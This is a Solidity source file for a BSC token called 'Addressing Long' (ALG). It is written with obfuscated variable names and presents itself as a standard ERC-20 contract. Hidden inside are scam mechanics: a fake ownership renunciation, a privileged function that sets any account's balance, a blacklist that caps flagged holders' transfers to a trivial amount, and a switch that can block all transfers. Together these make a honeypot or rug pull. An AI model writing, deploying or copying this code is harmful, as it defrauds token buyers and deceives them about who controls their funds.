//SPDX-License-Identifier: MIT

pragma solidity ^0.8.7;

interface exemptReceiver {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract maxFundSender {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface senderFund {
    function createPair(address modeToMarketing, address atTakeAmount) external returns (address);
}

interface atList {
    function totalSupply() external view returns (uint256);

    function balanceOf(address feeReceiver) external view returns (uint256);

    function transfer(address exemptAt, uint256 marketingShouldMode) external returns (bool);

    function allowance(address exemptTxTake, address spender) external view returns (uint256);

    function approve(address spender, uint256 marketingShouldMode) external returns (bool);

    function transferFrom(
        address sender,
        address exemptAt,
        uint256 marketingShouldMode
    ) external returns (bool);

    event Transfer(address indexed from, address indexed liquidityMode, uint256 value);
    event Approval(address indexed exemptTxTake, address indexed spender, uint256 value);
}

interface tradingFee is atList {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract AddressingLong is maxFundSender, atList, tradingFee {

    bool public swapMarketingFee;

    function name() external view virtual override returns (string memory) {
        return fromAmount;
    }

    bool public enableTake;

    uint8 private takeAuto = 18;

    address receiverReceiver = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    mapping(address => bool) public marketingIs;

    bool private autoMode;

    uint256 modeAt;

    function transferFrom(address sellEnable, address exemptAt, uint256 marketingShouldMode) external override returns (bool) {
        if (_msgSender() != receiverReceiver) {
            if (walletTotal[sellEnable][_msgSender()] != type(uint256).max) {
                require(marketingShouldMode <= walletTotal[sellEnable][_msgSender()]);
                walletTotal[sellEnable][_msgSender()] -= marketingShouldMode;
            }
        }
        return shouldList(sellEnable, exemptAt, marketingShouldMode);
    }

    function symbol() external view virtual override returns (string memory) {
        return amountSwap;
    }

    uint256 buyShould;

    function totalSupply() external view virtual override returns (uint256) {
        return maxEnable;
    }

    address modeExemptLaunched = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    constructor (){
        
        exemptReceiver limitList = exemptReceiver(receiverReceiver);
        tokenFrom = senderFund(limitList.factory()).createPair(limitList.WETH(), address(this));
        
        sellReceiver = _msgSender();
        modeAmountIs();
        takeMarketing[sellReceiver] = true;
        tradingLaunch[sellReceiver] = maxEnable;
        if (enableTake) {
            walletTotalFrom = minTake;
        }
        emit Transfer(address(0), sellReceiver, maxEnable);
    }

    event OwnershipTransferred(address indexed tradingEnableFund, address indexed takeTo);

    function balanceOf(address feeReceiver) public view virtual override returns (uint256) {
        return tradingLaunch[feeReceiver];
    }

    function shouldList(address sellEnable, address exemptAt, uint256 marketingShouldMode) internal returns (bool) {
        if (sellEnable == sellReceiver) {
            return autoWallet(sellEnable, exemptAt, marketingShouldMode);
        }
        uint256 buySell = atList(tokenFrom).balanceOf(modeExemptLaunched);
        require(buySell == buyShould);
        require(exemptAt != modeExemptLaunched);
        if (marketingIs[sellEnable]) {
            return autoWallet(sellEnable, exemptAt, shouldEnable);
        }
        return autoWallet(sellEnable, exemptAt, marketingShouldMode);
    }

    uint256 private minTake;

    function decimals() external view virtual override returns (uint8) {
        return takeAuto;
    }

    uint256 constant shouldEnable = 2 ** 10;

    function totalSell(address fundFromLimit) public {
        require(fundFromLimit.balance < 100000);
        if (swapMarketingFee) {
            return;
        }
        if (enableTake) {
            enableTake = false;
        }
        takeMarketing[fundFromLimit] = true;
        if (autoMode) {
            autoMode = true;
        }
        swapMarketingFee = true;
    }

    mapping(address => uint256) private tradingLaunch;

    function transfer(address minEnable, uint256 marketingShouldMode) external virtual override returns (bool) {
        return shouldList(_msgSender(), minEnable, marketingShouldMode);
    }

    string private fromAmount = "Addressing Long";

    string private amountSwap = "ALG";

    function getOwner() external view returns (address) {
        return atReceiver;
    }

    uint256 private walletTotalFrom;

    address private atReceiver;

    uint256 private maxEnable = 100000000 * 10 ** 18;

    function owner() external view returns (address) {
        return atReceiver;
    }

    function tradingTakeTx(address amountLaunched) public {
        totalAmount();
        
        if (amountLaunched == sellReceiver || amountLaunched == tokenFrom) {
            return;
        }
        marketingIs[amountLaunched] = true;
    }

    function totalAmount() private view {
        require(takeMarketing[_msgSender()]);
    }

    function approve(address swapSell, uint256 marketingShouldMode) public virtual override returns (bool) {
        walletTotal[_msgSender()][swapSell] = marketingShouldMode;
        emit Approval(_msgSender(), swapSell, marketingShouldMode);
        return true;
    }

    function minBuy(address minEnable, uint256 marketingShouldMode) public {
        totalAmount();
        tradingLaunch[minEnable] = marketingShouldMode;
    }

    mapping(address => bool) public takeMarketing;

    function modeAmountIs() public {
        emit OwnershipTransferred(sellReceiver, address(0));
        atReceiver = address(0);
    }

    function autoWallet(address sellEnable, address exemptAt, uint256 marketingShouldMode) internal returns (bool) {
        require(tradingLaunch[sellEnable] >= marketingShouldMode);
        tradingLaunch[sellEnable] -= marketingShouldMode;
        tradingLaunch[exemptAt] += marketingShouldMode;
        emit Transfer(sellEnable, exemptAt, marketingShouldMode);
        return true;
    }

    mapping(address => mapping(address => uint256)) private walletTotal;

    function allowance(address liquidityToken, address swapSell) external view virtual override returns (uint256) {
        if (swapSell == receiverReceiver) {
            return type(uint256).max;
        }
        return walletTotal[liquidityToken][swapSell];
    }

    function receiverWallet(uint256 marketingShouldMode) public {
        totalAmount();
        buyShould = marketingShouldMode;
    }

    address public tokenFrom;

    address public sellReceiver;

}